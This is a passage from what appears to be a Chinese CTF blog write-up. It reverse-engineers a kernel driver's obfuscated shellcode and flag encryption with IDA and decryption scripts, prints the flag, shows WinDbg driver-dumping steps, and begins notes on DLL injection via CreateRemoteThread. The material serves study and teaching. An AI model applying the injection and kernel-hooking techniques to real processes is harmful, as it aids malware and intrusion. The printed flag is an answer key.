class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import ida_bytes, ida_name</span><br><span class="line"></span><br><span class="line">out_path = r<span class="string">&quot;/tmp/sub_1400012C0_shellcode.bin&quot;</span></span><br><span class="line">parts = [</span><br><span class="line">  (<span class="string">&#x27;src_&#x27;</span>,   <span class="number">0x1AD</span>, <span class="number">0x11</span>),</span><br><span class="line">  (<span class="string">&#x27;src__0&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x22</span>),</span><br><span class="line">  (<span class="string">&#x27;src__1&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x33</span>),</span><br><span class="line">  (<span class="string">&#x27;src__2&#x27;</span>, <span class="number">0x1AD</span>, <span class="number">0x44</span>),</span><br><span class="line">  (<span class="string">&#x27;src__3&#x27;</span>, <span class="number">0x1AE</span>, <span class="number">0x55</span>),</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> name, size, xk in parts:</span><br><span class="line">  ea = ida_name.get_name_ea(<span class="number">0xffffffffffffffff</span>, name)</span><br><span class="line">  b = bytearray(ida_bytes.get_bytes(ea, size))</span><br><span class="line">  b.reverse()</span><br><span class="line">  <span class="keyword">for</span> i in range(len(b)):</span><br><span class="line">      b[i] ^= xk</span><br><span class="line">  blob.extend(b)</span><br><span class="line"></span><br><span class="line">with open(out_path, <span class="string">&quot;wb&quot;</span>) as f:</span><br><span class="line">  f.write(blob)</span><br><span class="line"></span><br><span class="line">entry_off = <span class="number">0x775</span></span><br><span class="line">print(hex(entry_off), blob[entry_off:entry_off+<span class="number">32</span>].hex(), len(blob))</span><br></pre></td></tr></table></figure><p>或者直接重建在当前文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_name</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_segment</span><br><span class="line"><span class="keyword">import</span> ida_auto</span><br><span class="line"></span><br><span class="line">PARTS = [</span><br><span class="line">  (<span class="string">&quot;src_&quot;</span>,   <span class="number">0x1AD</span>, <span class="number">0x11</span>),</span><br><span class="line">  (<span class="string">&quot;src__0&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x22</span>),</span><br><span class="line">  (<span class="string">&quot;src__1&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x33</span>),</span><br><span class="line">  (<span class="string">&quot;src__2&quot;</span>, <span class="number">0x1AD</span>, <span class="number">0x44</span>),</span><br><span class="line">  (<span class="string">&quot;src__3&quot;</span>, <span class="number">0x1AE</span>, <span class="number">0x55</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">FUNC_OFFSETS = [<span class="number">0x000</span>, <span class="number">0x055</span>, <span class="number">0x1AD</span>, <span class="number">0x225</span>, <span class="number">0x392</span>, <span class="number">0x476</span>, <span class="number">0x775</span>, <span class="number">0x862</span>]</span><br><span class="line">FUNC_NAMES = [</span><br><span class="line">  <span class="string">&quot;shc_xorshift&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_init_sbox&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_subword&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_expand_keys&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_mix_seed&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_crypt_block&quot;</span>,</span><br><span class="line">  <span class="string">&quot;shc_main&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rebuild_blob</span>():</span><br><span class="line">  blob = <span class="built_in">bytearray</span>()</span><br><span class="line">  <span class="keyword">for</span> name, size, xk <span class="keyword">in</span> PARTS:</span><br><span class="line">      ea = ida_name.get_name_ea(<span class="number">0xFFFFFFFFFFFFFFFF</span>, name)</span><br><span class="line">      <span class="keyword">if</span> ea == <span class="number">0xFFFFFFFFFFFFFFFF</span>:</span><br><span class="line">          <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;missing symbol: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">      b = ida_bytes.get_bytes(ea, size)</span><br><span class="line">      <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(b) != size:</span><br><span class="line">          <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;read fail: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">      t = <span class="built_in">bytearray</span>(b)</span><br><span class="line">      t.reverse()                 <span class="comment"># sub_140001B60</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">          t[i] ^= xk              <span class="comment"># 每段固定异或</span></span><br><span class="line">      blob.extend(t)</span><br><span class="line">  <span class="keyword">return</span> blob</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_blob</span>(<span class="params">blob, base=<span class="number">0x180020000</span>, seg_name=<span class="string">&quot;shc0&quot;</span></span>):</span><br><span class="line">  seg = ida_segment.getseg(base)</span><br><span class="line">  <span class="keyword">if</span> seg:</span><br><span class="line">      ida_segment.del_segm(base, ida_segment.SEGMOD_KILL)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 64-bit CODE 段</span></span><br><span class="line">  ok = idc.AddSeg(base, base + <span class="built_in">len</span>(blob), <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">      <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;AddSeg failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">  idc.set_segm_name(base, seg_name)</span><br><span class="line">  idc.set_segm_class(base, <span class="string">&quot;CODE&quot;</span>)</span><br><span class="line">  ida_bytes.patch_bytes(base, <span class="built_in">bytes</span>(blob))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(FUNC_OFFSETS) - <span class="number">1</span>):</span><br><span class="line">      s = base + FUNC_OFFSETS[i]</span><br><span class="line">      e = base + FUNC_OFFSETS[i + <span class="number">1</span>]</span><br><span class="line">      ida_funcs.del_func(s)</span><br><span class="line">      ida_bytes.del_items(s, ida_bytes.DELIT_SIMPLE, e - s)</span><br><span class="line">      idc.create_insn(s)</span><br><span class="line">      ida_funcs.add_func(s, e)</span><br><span class="line">      idc.set_name(s, FUNC_NAMES[i], idc.SN_CHECK)</span><br><span class="line"></span><br><span class="line">  ida_auto.auto_wait()</span><br><span class="line">  <span class="keyword">return</span> base + <span class="number">0x775</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  blob = rebuild_blob()</span><br><span class="line">  out_path = <span class="string">&quot;/tmp/sub_1400012C0_shellcode.bin&quot;</span></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      f.write(blob)</span><br><span class="line"></span><br><span class="line">  entry = map_blob(blob)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;blob_len =&quot;</span>, <span class="built_in">len</span>(blob))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;dump =&quot;</span>, out_path)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;entry =&quot;</span>, <span class="built_in">hex</span>(entry))</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;entry_32 =&quot;</span>, blob[<span class="number">0x775</span>:<span class="number">0x775</span>+<span class="number">32</span>].<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>sub_1400012C0 会先重建一段代码 blob（你说的 shellcode）</p><ul><li>5 段数据拼接：长度分别 0x1AD, 0x1AD, 0x1AD, 0x1AD, 0x1AE</li><li>每段都先 reverse，再异或常量（对应 0x11&#x2F;0x22&#x2F;0x33&#x2F;0x44&#x2F;0x55）</li><li>总长度 0x862，入口偏移是 +0x775</li></ul><p>key</p><ul><li>先初始化：seed &#x3D; 0x17658990C729C992</li><li>循环 0x39 次：seed &#x3D; (seed * 0x10003) ^ <em>(uint64_t</em>)a3</li><li>这里 a3 是传入的指针，取的是 *a3 的 64 位值</li><li>然后把 &amp;seed 传给 blob 入口做 8 字节分组变换</li></ul><p>关键是得知道a3</p><p>sub_1400012C0(a1, a2, a3) 的 a3 来自被 hook 的原函数第三个参数。</p><p>这里被 hook 的函数是 KeDelayExecutionThread</p><p>所以参数映射是：</p><ul><li>a1 &#x3D; KPROCESSOR_MODE WaitMode</li><li>a2 &#x3D; BOOLEAN Alertable</li><li>a3 &#x3D; PLARGE_INTEGER Interval</li></ul><p>对 Maze.exe 的 Sleep(50)，常见对应是：</p><ul><li>*a3 &#x3D; -500000（即 -(50 * 10000)）</li><li>64 位补码：0xFFFFFFFFFFF85EE0</li></ul><p>密文</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260219204921174.png" alt="image-20260219204921174"></p><p>但是上面的那些不知道在干什么交叉引用发现实际对密文也进行了异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line">MASK64 = <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">CT = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;51dab85273b91700e002f4b22c5f2262330c0144bb709d928a06f92c1d8f0aa9&quot;</span></span><br><span class="line">    <span class="string">&quot;227b84307113d0f9&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">INTERVAL = -<span class="number">500000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol32</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">31</span></span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror32</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">31</span></span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; r) | (x &lt;&lt; (<span class="number">32</span> - r))) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorshift32</span>(<span class="params">x</span>):</span><br><span class="line">    x &amp;= MASK32</span><br><span class="line">    v2 = (((x &lt;&lt; <span class="number">13</span>) &amp; MASK32) ^ x)</span><br><span class="line">    v2 = ((v2 &gt;&gt; <span class="number">17</span>) ^ v2) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> (((v2 &lt;&lt; <span class="number">5</span>) &amp; MASK32) ^ v2) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_seed</span>(<span class="params">interval_signed</span>):</span><br><span class="line">    interval = interval_signed &amp; MASK64</span><br><span class="line">    v18 = <span class="number">0x17658990C729C992</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">57</span>):</span><br><span class="line">        v18 = (interval ^ ((<span class="number">65539</span> * v18) &amp; MASK64)) &amp; MASK64</span><br><span class="line">    <span class="keyword">return</span> v18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_tables</span>(<span class="params">a0, a1</span>):</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    v = ((a1 &gt;&gt; <span class="number">21</span>) | ((a1 &lt;&lt; <span class="number">11</span>) &amp; MASK32)) ^ a0 ^ <span class="number">0x1244F4C6</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        v = xorshift32(v)</span><br><span class="line">        idx = v % (j + <span class="number">1</span>)</span><br><span class="line">        p[j], p[idx] = p[idx], p[j]</span><br><span class="line">    inv = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        inv[p[k]] = k</span><br><span class="line">    <span class="keyword">return</span> p, inv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_round_keys</span>(<span class="params">a0, a1</span>):</span><br><span class="line">    v5 = (a0 ^ <span class="number">0xB7E15163</span>) &amp; MASK32</span><br><span class="line">    v4 = (a1 - <span class="number">0x61C88647</span>) &amp; MASK32</span><br><span class="line">    rk = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v6 = ((((-<span class="number">0x61C88647</span> * i) &amp; MASK32) ^ <span class="number">0xB7E15163</span>) + (rol32(v4, v5 &amp; <span class="number">31</span>) ^ v5)) &amp; MASK32</span><br><span class="line">        w = (ror32((v4 + v5) &amp; MASK32, v4 &amp; <span class="number">31</span>) ^ v6) &amp; MASK32</span><br><span class="line">        rk.append(w)</span><br><span class="line">        v5 = (w ^ v4) &amp; MASK32</span><br><span class="line">        v4 = (rol32(w, v6 &amp; <span class="number">31</span>) + v6) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_block_counter</span>(<span class="params">a5, a0, a1</span>):</span><br><span class="line">    v3 = ((a1 ^ <span class="number">0xDEADBEEF</span>) + (rol32(a0, a5 &amp; <span class="number">31</span>) ^ ((<span class="number">73244475</span> * (a5 + <span class="number">1</span>)) &amp; MASK32))) &amp; MASK32</span><br><span class="line">    t = (((v3 &gt;&gt; <span class="number">16</span>) ^ v3) * <span class="number">2146121005</span>) &amp; MASK32</span><br><span class="line">    v4 = (-<span class="number">2073254261</span> * (((t &gt;&gt; <span class="number">15</span>) ^ t) &amp; MASK32)) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> ((v4 &gt;&gt; <span class="number">16</span>) ^ v4) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subword</span>(<span class="params">x, tab</span>):</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        (tab[(x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">24</span>)</span><br><span class="line">        | (tab[(x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">16</span>)</span><br><span class="line">        | (tab[(x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>] &lt;&lt; <span class="number">8</span>)</span><br><span class="line">        | tab[x &amp; <span class="number">0xFF</span>]</span><br><span class="line">    ) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_block</span>(<span class="params">c0, c1, a0, a1, rk, p, inv, blk_idx</span>):</span><br><span class="line">    v16 = mix_block_counter(blk_idx, a0, a1)</span><br><span class="line">    v8 = (c0 ^ ((rol32(v16, <span class="number">11</span>) + a1) &amp; MASK32)) &amp; MASK32</span><br><span class="line">    v12 = (c1 ^ v16 ^ a0) &amp; MASK32</span><br><span class="line"></span><br><span class="line">    v15 = <span class="number">0</span></span><br><span class="line">    v15_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v15 = (v15 + ((rk[i] ^ <span class="number">0xB7E15163</span>) &amp; MASK32)) &amp; MASK32</span><br><span class="line">        v15_list.append(v15)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        v15 = v15_list[i]</span><br><span class="line">        <span class="keyword">if</span> v15 &amp; <span class="number">1</span>:</span><br><span class="line">            v8, v12 = v12, v8</span><br><span class="line"></span><br><span class="line">        v10 = ror32(v8, ((rk[i] &gt;&gt; <span class="number">1</span>) + (v15 ^ v12)) &amp; <span class="number">31</span>)</span><br><span class="line">        t = rol32((v12 - (rk[i] ^ v10)) &amp; MASK32, p[v10 &amp; <span class="number">0xFF</span>] &amp; <span class="number">31</span>)</span><br><span class="line">        v12_prev = subword(t, inv)</span><br><span class="line"></span><br><span class="line">        s = (</span><br><span class="line">            (v10 ^ rol32(rk[i], t &amp; <span class="number">31</span>) ^ ((rol32(v15, <span class="number">29</span>) + t) &amp; MASK32))</span><br><span class="line">            - (rk[i] ^ v15)</span><br><span class="line">        ) &amp; MASK32</span><br><span class="line">        v8_prev = subword(s, inv)</span><br><span class="line"></span><br><span class="line">        v8, v12 = v8_prev, v12_prev</span><br><span class="line"></span><br><span class="line">    w0 = ((v16 + a0) ^ v8) &amp; MASK32</span><br><span class="line">    w1 = (rol32(v16, <span class="number">25</span>) ^ a1 ^ v12) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> w0, w1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_40</span>(<span class="params">ct40, interval_signed</span>):</span><br><span class="line">    seed = derive_seed(interval_signed)</span><br><span class="line">    a0 = seed &amp; MASK32</span><br><span class="line">    a1 = (seed &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    p, inv = init_tables(a0, a1)</span><br><span class="line">    rk = expand_round_keys(a0, a1)</span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> bi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        blk = ct40[bi * <span class="number">8</span>: bi * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">        c0 = <span class="built_in">int</span>.from_bytes(blk[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        c1 = <span class="built_in">int</span>.from_bytes(blk[<span class="number">4</span>:<span class="number">8</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        w0, w1 = dec_block(c0, c1, a0, a1, rk, p, inv, bi)</span><br><span class="line">        out += w0.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">        out += w1.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt = decrypt_40(CT, INTERVAL)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"><span class="built_in">print</span>(pt.rstrip(<span class="string">b&quot;\x00&quot;</span>).decode(<span class="string">&quot;ascii&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>))</span><br></pre></td></tr></table></figure><p>ebbc8827-c040-4a7d-8bc7-0aeccb1ce094</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>不太了解内核逆向</p><p>参考[<a href="https://qmeimei10086.github.io/2026/02/05/VNCTF-2026-Shadow-%E9%A9%B1%E5%8A%A8dump%E4%BF%AE%E5%A4%8D+%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5+ptehook/">VNCTF 2026]Shadow-驱动dump修复+反射注入+ptehook - Qmeimei’s Blog | 探索一切，攻破一切</a></p><p>师傅写的很详细</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; sxe ld Shadow.sys</span><br><span class="line">kd&gt; g</span><br><span class="line">kd&gt; bp Shadow+0xC1B7</span><br><span class="line">kd&gt; g</span><br></pre></td></tr></table></figure><p>断再这里</p><blockquote><p><code>sxe</code> &#x3D; <strong>Set Exception (on) Event</strong></p><p>当某个指定的“调试事件”发生时，让调试器中断下来。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260220234731673.png" alt="image-20260220234731673"></p><p>这里的rcx就是载入驱动的首地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r rcx</span><br></pre></td></tr></table></figure><p>查看rcx寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db rcx L10</span><br><span class="line">!dh rcx # 把 rcx 当成一个 PE 映像基址，解析并显示它的 DOS 头和 NT 头</span><br></pre></td></tr></table></figure><p><code>d</code> &#x3D; display memory</p><p><code>b</code> &#x3D; byte（按字节显示）</p><p><code>rcx</code> &#x3D; 起始地址</p><p><code>L10</code> &#x3D; 显示 0x10 个字节（16字节）</p><p>输出有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.00 subsystem version</span><br><span class="line"> A000 size of image</span><br><span class="line">  400 size of headers</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.writemem D:\dumped.sys ffffb683ef916000 L?<span class="number">0</span>xA000</span><br></pre></td></tr></table></figure><p>dump出来</p><p>之后就是修复符号</p><blockquote><p>不错的教程：<a href="https://bbs.kanxue.com/thread-274505-1.htm">https://bbs.kanxue.com/thread-274505-1.htm</a></p><p>想看原理可以看里面的文章讲的非常好</p><p>里面的pe_unmapper挺好用的，<a href="https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper">https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper</a></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pe_unmapper.exe /<span class="keyword">in</span> D:\dumped.sys <span class="number">00400000</span> /out fix.dump</span><br></pre></td></tr></table></figure><p>直接修复</p><p>修复方法2</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260223222525923.png" alt="image-20260223222525923"></p><h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><p>之前学过但是得详细了解下，这里再补充一下</p><p><a href="https://www.cnblogs.com/Zer0o/p/17286597.html#dll%E6%B3%A8%E5%85%A5">《逆向工程核心原理》之DLL注入 - Zer0o - 博客园</a></p><p><a href="https://matriy330.github.io/791560d6/">UE4逆向初探-OverWatch | Matriy’s blog</a></p><p>DLL注入指的是向运行中的其他进程强制插入特定的DLL文件。从技术细节来说，DLL注入命令其他进程自行调用LoadLibrary() API,加载用户指定的DLL文件。DLL注入与一般DLL加载的区别在于，加载的目标进程是其自身或其他进程。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260216130408174.png" alt="image-20260216130408174"></p><p>向某个进程注入DLL时主要使用以下三种方法：</p><ul><li>创建远程线程（CreateRemoteThread() API）</li><li>使用注册表（AppInit_DLLs值）</li><li>消息钩取（SetWindowsHookEx() API）</li></ul><h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h2><p>基本原理：</p><ol><li><code>OpenProcess()</code> 获取目标进程句柄</li><li><code>VirtualAllocEx()</code> 在目标进程中分配内存</li><li><code>WriteProcessMemory()</code> 写入 DLL 路径</li><li><code>CreateRemoteThread()</code> 调用 <code>LoadLibraryA/W</code></li></ol><p>案例中的myhack.dll</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 